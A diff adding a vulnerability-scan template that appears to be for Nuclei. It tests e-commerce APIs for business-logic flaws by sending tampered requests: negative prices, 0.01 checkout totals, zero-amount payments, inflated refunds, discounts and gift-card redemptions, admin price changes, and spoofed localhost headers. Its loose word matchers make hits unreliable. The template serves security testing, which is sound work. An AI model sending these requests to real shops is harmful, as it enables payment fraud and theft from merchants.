@@ -1,0 +1,455 @@
+id: medium-webapp-business-logic-price-manipulation
+
+info:
+  name: Business Logic Price Manipulation - Elite Red Team
+  author: elite-red-team
+  severity: high
+  description: |
+    Advanced business logic flaws in price manipulation and payment bypass.
+    Tests for parameter tampering, negative pricing, currency manipulation, and discount abuse.
+    Includes multiple e-commerce exploitation techniques and payment gateway bypass methods.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/10-Business_Logic_Testing/
+    - https://portswigger.net/web-security/logic-flaws
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
+    cvss-score: 6.5
+    cwe-id: CWE-840
+  tags: business-logic,price-manipulation,payment-bypass,red-team
+
+variables:
+  # Common product IDs for testing
+  product_ids:
+    - "1"
+    - "100"
+    - "999"
+    - "premium_item"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/cart/add"
+      - "{{BaseURL}}/cart/add"
+      - "{{BaseURL}}/add-to-cart"
+
+    headers:
+      Content-Type: application/json
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-For: 127.0.0.1
+      X-Real-IP: 127.0.0.1
+
+    # Test negative price manipulation
+    body: |
+      {
+        "product_id": "1",
+        "quantity": 1,
+        "price": -100.00,
+        "discount": 0
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: word
+        part: body
+        words:
+          - "added"
+          - "cart"
+          - "success"
+          - "-100"
+        condition: or
+
+      - type: word
+        part: body
+        words:
+          - "invalid price"
+          - "price error"
+          - "negative not allowed"
+        condition: and
+        negative: true
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - '"total":\s*([+-]?\d+\.?\d*)'
+          - '"price":\s*([+-]?\d+\.?\d*)'
+
+  - method: PUT
+    path:
+      - "{{BaseURL}}/api/cart/update"
+      - "{{BaseURL}}/cart/update"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-Proto: https
+
+    # Test quantity manipulation with negative values
+    body: |
+      item_id=1&quantity=-5&price=100.00
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "updated"
+          - "cart"
+          - "-5"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/checkout"
+      - "{{BaseURL}}/checkout"
+      - "{{BaseURL}}/order/create"
+
+    headers:
+      Content-Type: application/json
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    # Test checkout with manipulated total
+    body: |
+      {
+        "items": [
+          {
+            "product_id": "premium_item",
+            "quantity": 1,
+            "unit_price": 1000.00,
+            "total_price": 0.01
+          }
+        ],
+        "subtotal": 0.01,
+        "tax": 0.00,
+        "shipping": 0.00,
+        "total": 0.01
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: word
+        part: body
+        words:
+          - "order"
+          - "created"
+          - "success"
+          - "0.01"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/payment/process"
+      - "{{BaseURL}}/payment"
+
+    headers:
+      Content-Type: application/json
+      Authorization: Bearer {{token}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-For: 127.0.0.1
+
+    # Test payment with zero amount
+    body: |
+      {
+        "order_id": "12345",
+        "amount": 0.00,
+        "currency": "USD",
+        "payment_method": "credit_card",
+        "card_number": "4111111111111111"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: word
+        part: body
+        words:
+          - "payment"
+          - "success"
+          - "processed"
+          - "0.00"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/discount/apply"
+      - "{{BaseURL}}/apply-coupon"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    # Test discount manipulation
+    body: |
+      coupon_code=SAVE10&discount_amount=999999.99&order_total=100.00
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "applied"
+          - "discount"
+          - "999999"
+        condition: or
+
+  - method: PUT
+    path:
+      - "{{BaseURL}}/api/order/{{order_id}}"
+      - "{{BaseURL}}/order/update"
+
+    headers:
+      Content-Type: application/json
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-Proto: https
+
+    # Test order total manipulation after creation
+    body: |
+      {
+        "order_id": "12345",
+        "status": "pending",
+        "total_amount": 0.01,
+        "items": [
+          {
+            "product_id": "expensive_item",
+            "price": 0.01,
+            "original_price": 1000.00
+          }
+        ]
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "updated"
+          - "order"
+          - "0.01"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/refund"
+      - "{{BaseURL}}/refund/request"
+
+    headers:
+      Content-Type: application/json
+      Authorization: Bearer {{token}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    # Test refund amount manipulation
+    body: |
+      {
+        "order_id": "12345",
+        "refund_amount": 99999.99,
+        "original_amount": 10.00,
+        "reason": "defective_product"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: word
+        part: body
+        words:
+          - "refund"
+          - "processed"
+          - "99999"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/currency/convert"
+      - "{{BaseURL}}/currency"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-For: 127.0.0.1
+
+    # Test currency manipulation
+    body: |
+      amount=1000.00&from_currency=USD&to_currency=USD&exchange_rate=0.001
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "converted"
+          - "currency"
+          - "0.001"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/subscription/upgrade"
+      - "{{BaseURL}}/upgrade"
+
+    headers:
+      Content-Type: application/json
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    # Test subscription price manipulation
+    body: |
+      {
+        "plan_id": "premium",
+        "billing_cycle": "monthly",
+        "price_override": 0.01,
+        "original_price": 99.99,
+        "promo_code": "MANIPULATED"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: word
+        part: body
+        words:
+          - "upgraded"
+          - "subscription"
+          - "0.01"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/gift-card/redeem"
+      - "{{BaseURL}}/redeem-gift-card"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Authorization: Bearer {{token}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-Proto: https
+
+    # Test gift card value manipulation
+    body: |
+      gift_card_code=GIFT123&redeem_amount=99999.99&card_balance=50.00
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "redeemed"
+          - "gift card"
+          - "99999"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/loyalty/points"
+      - "{{BaseURL}}/loyalty/redeem"
+
+    headers:
+      Content-Type: application/json
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    # Test loyalty points manipulation
+    body: |
+      {
+        "user_id": "12345",
+        "points_to_redeem": 999999,
+        "available_points": 100,
+        "conversion_rate": 0.01,
+        "cash_value": 9999.99
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "redeemed"
+          - "points"
+          - "999999"
+        condition: or
+
+  - method: PUT
+    path:
+      - "{{BaseURL}}/api/inventory/{{product_id}}"
+      - "{{BaseURL}}/product/update"
+
+    headers:
+      Content-Type: application/json
+      Authorization: Bearer {{admin_token}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    # Test inventory price manipulation
+    body: |
+      {
+        "product_id": "premium_item",
+        "price": 0.01,
+        "original_price": 1000.00,
+        "stock": 999,
+        "status": "active"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "updated"
+          - "product"
+          - "0.01"
+        condition: or
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - '"balance":\s*([+-]?\d+\.?\d*)'
+          - '"total":\s*([+-]?\d+\.?\d*)'
+          - '"amount":\s*([+-]?\d+\.?\d*)'
+          - '"price":\s*([+-]?\d+\.?\d*)'
